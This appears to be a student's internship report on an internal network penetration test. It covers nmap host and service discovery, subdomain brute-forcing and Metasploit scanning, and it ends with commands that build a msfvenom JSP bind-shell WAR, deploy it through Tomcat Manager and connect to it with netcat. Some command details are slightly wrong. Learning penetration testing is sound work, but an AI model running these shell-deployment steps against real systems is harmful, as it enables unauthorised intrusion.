# Internship_Report

<p align="center">
  <img src="https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032019/untitled-1_245.png?PZfG4BZ0MhiFothT02x6wcPjPrqeJsUK&itok=ye6EVwSc" alt="KNUST Logo" width="300"/>
</p>

## Network Penetration Testing

### Submitted by:
<p>Francis Dorsaa</p>
<p>Index Number: </p>
<p>Student number: </p>

# Table of Contents
1. [Summary](#summary)
2. [Testing_Methodogy](#TestingMethodogy)
3. [Host_Discovery](#HostDiscovery)
4. [Sevice_Discovery_and_Port_Scanning](#SeviceDiscoveryandPortScanning)
5. [vulnerabilities](#Vulnerabilities)
6. [Web-Based_Attack_Surfaces](#Web-BasedAttackSurfaces)


# Summary
An Internal Network Penetration Test was conducted on the network range 10.10.10.0/24 and the domain https://virtualinfosecafrica.com/ between September 12th and September 14th, 2024. This report details the findings from the penetration test, which captures the network security status of the specified scope at that particular moment. Further information can be found in the following sections.

# Testing_Methodogy
The testing began with the use of the Network Mapper (NMAP) tool to identify active hosts and services within the provided IP address range. The results from this tool were then reviewed manually, with hosts and services being individually enumerated to identify any potential vulnerabilities or weaknesses that may have been overlooked. Additionally, web-based attack surfaces were exploited to create and deploy payloads.

# Host Discovery
Host discovery involves identifying active devices on a network. This process helps to refine the scope of a network assessment or security testing. One of the most commonly used tools for host discovery is Nmap.

Nmap is an open-source command-line tool that uses ICMP, echo requests, TCP, and UDP packets to detect active hosts on a network.

When using Nmap, various options or arguments are available for host discovery, depending on the specific objectives. Some of these include:
- `-sL`: List scan (Simply lists the targets to be scanned)
- `-sN`: Ping scan (Disables port scanning)
- `-Pn`: Treats all hosts as online (Skips host discovery)

For our scan report, we used the `-sn` argument. The command executed was `nmap -sn 10.10.10.0/24`. Here, `-sn` (or `--ping-scan`) directs Nmap to perform a ping scan, which identifies live hosts without conducting a full port scan. This method only verifies if hosts are active, without detailing the services they are running. The `10.10.10.0/24` specifies the target network, with `/24` representing a subnet mask of 255.255.255.0. This means the scan covers all IP addresses from 10.10.10.1 to 10.10.10.254.

![Example Image](Images/ping_scan.png)

#### For -sL scan

![List_scan](Images/list_scan.png)

#### For -Pn scan

![Bypass_scan](Images/Bypass_online.png)

The output from the Nmap command provides details about active hosts. To filter and extract only the lines that indicate which hosts are online, you can use tools like grep and awk. The command to achieve this is:

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}'

This command works as follows:

grep "Nmap scan report for" filters the output to include only lines that contain the phrase "Nmap scan report for," which indicates an active host.
awk '{print $5}' extracts and displays the fifth field from these lines, which corresponds to the IP addresses of the hosts that are up.

![PSG](Images/ping_scan_grep.png)

This command sequence utilizes `grep` to identify lines indicating that a host is online and `awk` to extract and print only the IP addresses of those hosts.

To save the results to a file, you can redirect the output of the command to a file. For example:

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}' > hosts_up.txt

This command will save the IP addresses of the active hosts into a file named `hosts_up.txt`.

![Host_up](Images/host_up.png)

This command will create (or overwrite) a file named `hosts_up.txt` containing the list of IP addresses for active hosts.

To verify that the file has been correctly written, you can use the following command to view its contents:

cat hosts_up.txt

For subdomain enumeration, you can use the `aiodnsbrute` tool. To enumerate subdomains for `https://virtualinfosecafrica.com` using a wordlist located at `/usr/share/wordlists/rockyou.txt`, use the following command:

aiodnsbrute -d virtualinfosecafrica.com -w /usr/share/wordlists/rockyou.txt > subdomains.txt

This command will output the discovered subdomains into a file named `subdomains.txt`.

# Sevice Discovery and Port Scanning
Service discovery, or port scanning, involves actively probing a target network to identify open ports and the services running on them. This process maps out the applications and potential vulnerabilities exposed by checking which ports are actively listening for connections, thereby providing crucial information for further penetration testing.

Service discovery and port scanning are key aspects of network security assessments, penetration testing, and overall network management. Understanding which services are active and which ports are open is vital for evaluating a system's security posture. Unsecured or outdated services can be exploited if not properly managed.

Certain services may have known vulnerabilities. Identifying these services allows you to apply relevant security patches or adjustments. Additionally, ensuring that only authorized services are running is often necessary for compliance with security standards and regulations.

To conduct a service discovery scan and save the results in a greppable Nmap format, use the following command:

nmap -sV -oG nmap_services.txt 10.10.10.0/24

![nmap_oG](Images/nmap_oG.png)

After obtaining the Nmap results in greppable format, you can filter the results by protocol using `grep`.

To extract TCP services from the results, use the following command:

grep "/tcp" nmap_services.txt > tcp_services_separated.txt

This command searches for lines containing "/tcp" in the `nmap_services.txt` file and saves the filtered results to `tcp_services_separated.txt`.

![grep_tcp](Images/grep_tcp.png)


# Vulnerabilities
Vulnerabilities are scan using metasploit by first running metasploit console

In the Metasploit console, we use the db_import command to import the results.

db_import /path/to/nmap_results.xml

we now search for available auxiliary modules in Metasploit that can scan for vulnerabilities based on nmap results, we use:

search type:auxiliary
using: use auxiliary/scanner/http/http_login , we can scan for vulnerabilities

![msconf](Images/msconf.png)

![searchtype](Images/searchtype.png)

![aux](Images/auxiliary.png)


# Web-Based Attack Surfaces
Web-based attacks exploit vulnerabilities in web applications to gain unauthorized access, steal data, or disrupt services. Common attack types include SQL Injection, XSS, CSRF, File Inclusion, Command Injection, Broken Authentication, Directory Traversal, Security Misconfiguration, Insecure Deserialization, and SSRF. To protect against these attacks, employ secure coding practices, input validation, proper authentication mechanisms, and regularly update and configure your web applications and servers.

To use eyewitness to take screenshots  of web severs including those running on non-standard HTTP/HTTPS ports, we use the following command:

eyewitness -f hosts.txt --web --resolve --ports 80,443.8080,8443

#### Generating Payloads
To use msfvenom to generate a payload that can trigger TCP bind shell, we use the command line;

#### msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war -o bind_shell.war

We then deploy the WAR file to the Tomcat server. We can do this by accessing the Tomcat Manager interface and uploading the bind_shell.war file.
Now we can access the bind shell by connecting to the specified port on the target machine. For example, if you set the port to 4444, you can use netcat to connect:

#### nc 10.10.10.55 4444

![web_attack-surfaces_1](Images/web_attack-surfaces_1.png)

![WBAS](Images/WBAS.png)
